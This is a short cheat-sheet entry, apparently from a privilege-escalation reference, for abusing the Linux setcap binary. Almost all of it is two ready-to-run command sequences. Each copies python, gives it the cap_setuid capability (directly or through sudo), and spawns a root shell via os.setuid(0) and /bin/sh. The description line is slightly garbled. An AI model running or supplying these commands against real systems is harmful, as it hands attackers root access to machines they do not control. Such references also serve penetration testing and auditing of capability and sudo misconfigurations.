suid.description: Can be used to give and capabilities to other files. cap_setuid for example gives an executable permissions to switch uid.
suid.code:
cp $(which python) .
setcap cap_setuid+ep python
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

sudo.code:
cp $(which python) .
sudo setcap cap_setuid+ep python
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
